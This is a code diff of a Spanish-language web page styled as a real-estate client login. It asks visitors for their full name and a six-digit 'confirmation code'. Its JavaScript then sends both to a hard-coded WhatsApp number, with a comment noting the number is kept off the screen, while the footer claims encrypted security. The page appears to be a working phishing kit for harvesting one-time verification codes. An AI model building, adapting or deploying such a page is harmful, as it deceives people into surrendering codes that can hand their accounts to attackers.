@@ -4,48 +4,197 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Casascuba - Validación</title>
+    <title>Inmobiliaria Premium | Acceso Clientes</title>
     <style>
-        body { font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background-color: #f0f0f0; margin: 0; }
-        .container { background: white; padding: 2rem; border-radius: 8px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); text-align: center; width: 90%; max-width: 400px; }
-        h2 { color: #333; }
-        .input-group { margin-bottom: 1rem; }
-        input[type="text"] { width: 100%; padding: 10px; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; }
-        .code-inputs { display: flex; justify-content: space-between; margin-bottom: 1.5rem; }
-        .code-inputs input { width: 40px; height: 40px; text-align: center; font-size: 1.2rem; border: 1px solid #ccc; border-radius: 4px; }
-        .btn-primary { background-color: #007bff; color: white; border: none; padding: 12px 20px; border-radius: 4px; cursor: pointer; width: 100%; font-size: 1rem; }
-        .btn-primary:hover { background-color: #0056b3; }
+        /* ESTILOS VISUALES (CSS) */
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #f0f2f5;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        /* Portada con fotos de casas bonitas */
+        .hero {
+            width: 100%;
+            height: 45vh;
+            background: url('https://images.unsplash.com/photo-1600585154340-be6161a56a0c?auto=format&fit=crop&w=1350&q=80') no-repeat center center/cover;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            position: relative;
+        }
+
+        .hero::before {
+            content: "";
+            position: absolute;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0, 0, 0, 0.4);
+        }
+
+        .hero-text {
+            position: relative;
+            color: white;
+            text-align: center;
+            text-shadow: 2px 2px 10px rgba(0,0,0,0.5);
+        }
+
+        .hero-text h1 { font-size: 2.5rem; margin-bottom: 10px; }
+
+        /* Contenedor del Formulario */
+        .login-card {
+            background: white;
+            width: 90%;
+            max-width: 450px;
+            padding: 40px;
+            border-radius: 15px;
+            box-shadow: 0 15px 35px rgba(0,0,0,0.2);
+            margin-top: -60px;
+            z-index: 10;
+            text-align: center;
+        }
+
+        .login-card h2 { color: #333; margin-bottom: 25px; }
+
+        .input-group { text-align: left; margin-bottom: 25px; }
+        
+        .input-group label { 
+            display: block; 
+            margin-bottom: 8px; 
+            font-weight: bold; 
+            color: #555;
+        }
+
+        .input-name {
+            width: 100%;
+            padding: 15px;
+            border: 2px solid #ddd;
+            border-radius: 8px;
+            font-size: 16px;
+            outline: none;
+            transition: border-color 0.3s;
+        }
+
+        .input-name:focus { border-color: #2c3e50; }
+
+        /* Cuadritos del Código de 6 dígitos */
+        .code-wrapper {
+            display: flex;
+            justify-content: space-between;
+            gap: 8px;
+            margin: 20px 0 30px;
+        }
+
+        .code-digit {
+            width: 50px;
+            height: 60px;
+            border: 2px solid #ddd;
+            border-radius: 10px;
+            text-align: center;
+            font-size: 24px;
+            font-weight: bold;
+            color: #333;
+            outline: none;
+            transition: all 0.2s;
+        }
+
+        .code-digit:focus {
+            border-color: #25d366;
+            box-shadow: 0 0 8px rgba(37, 211, 102, 0.3);
+        }
+
+        /* Botón de Confirmar */
+        .btn-confirm {
+            width: 100%;
+            background-color: #1a1a1a;
+            color: white;
+            padding: 18px;
+            border: none;
+            border-radius: 8px;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background 0.3s;
+        }
+
+        .btn-confirm:hover { background-color: #333; }
+
+        .footer-info { margin-top: 20px; font-size: 0.9rem; color: #888; }
     </style>
 </head>
 <body>
 
-<div class="container">
-    <h2>Validar Acceso</h2>
-    <form action="https://api.web3forms.com/submit" method="POST">
-        
-        <input type="hidden" name="access_key" value="644a1453-3ad6-45e9-8671-678b7d3d90d4">
-        
-        <input type="hidden" name="subject" value="Nuevo cliente de Casascuba">
-        <input type="hidden" name="from_name" value="Casascuba Web">
-        <input type="hidden" name="redirect" value="https://casascubahttp.github.io/Casascuba-/">
-
-        <div class="input-group">
-            <input type="text" name="name" placeholder="Nombre completo" required>
+    <header class="hero">
+        <div class="hero-text">
+            <h1>Exclusividad & Confort</h1>
+            <p>Tu próximo hogar te está esperando</p>
         </div>
+    </header>
 
-        <p>Ingrese el código de 6 dígitos:</p>
-        <div class="code-inputs">
-            <input type="text" name="codigo_1" maxlength="1" required>
-            <input type="text" name="codigo_2" maxlength="1" required>
-            <input type="text" name="codigo_3" maxlength="1" required>
-            <input type="text" name="codigo_4" maxlength="1" required>
-            <input type="text" name="codigo_5" maxlength="1" required>
-            <input type="text" name="codigo_6" maxlength="1" required>
-        </div>
+    <div class="login-card">
+        <h2>Verificación de Usuario</h2>
+        
+        <form id="mainForm">
+            <div class="input-group">
+                <label>Nombre Completo</label>
+                <input type="text" id="userName" class="input-name" placeholder="Ej: Juan Pérez" required>
+            </div>
 
-        <button type="submit" class="btn-primary">VALIDAR ACCESO</button>
-    </form>
-</div>
+            <label style="font-weight: bold; color: #555;">Código de Confirmación</label>
+            <div class="code-wrapper">
+                <input type="text" maxlength="1" class="code-digit" required pattern="\d*">
+                <input type="text" maxlength="1" class="code-digit" required pattern="\d*">
+                <input type="text" maxlength="1" class="code-digit" required pattern="\d*">
+                <input type="text" maxlength="1" class="code-digit" required pattern="\d*">
+                <input type="text" maxlength="1" class="code-digit" required pattern="\d*">
+                <input type="text" maxlength="1" class="code-digit" required pattern="\d*">
+            </div>
+
+            <button type="submit" class="btn-confirm">CONFIRMAR Y ACCEDER</button>
+        </form>
+
+        <p class="footer-info">Inmobiliaria © 2026 - Seguridad Encriptada</p>
+    </div>
+
+    <script>
+        // LÓGICA DE FUNCIONAMIENTO (JAVASCRIPT)
+        const digits = document.querySelectorAll('.code-digit');
+
+        // Función para saltar automáticamente de cuadrito
+        digits.forEach((input, index) => {
+            input.addEventListener('input', (e) => {
+                if (e.target.value.length === 1 && index < digits.length - 1) {
+                    digits[index + 1].focus();
+                }
+            });
+
+            // Permitir borrar y regresar atrás
+            input.addEventListener('keydown', (e) => {
+                if (e.key === 'Backspace' && e.target.value === '' && index > 0) {
+                    digits[index - 1].focus();
+                }
+            });
+        });
+
+        // Al darle clic al botón "Confirmar y Acceder"
+        document.getElementById('mainForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+
+            const nombre = document.getElementById('userName').value;
+            let codigoCompleto = "";
+            digits.forEach(input => codigoCompleto += input.value);
+
+            // Datos de envío (Tu número +53 52416260 configurado internamente)
+            const miTelefono = "5352416260";
+            const textoMensaje = `*NUEVO REGISTRO DE VENTA*%0A%0A*Cliente:* ${nombre}%0A*Código de Acceso:* ${codigoCompleto}%0A%0A_Enviado desde el portal web._`;
+
+            // Redirige a WhatsApp sin mostrar el número en pantalla
+            window.location.href = `https://wa.me/${miTelefono}?text=${textoMensaje}`;
+        });
+    </script>
 
 </body>
 </html>
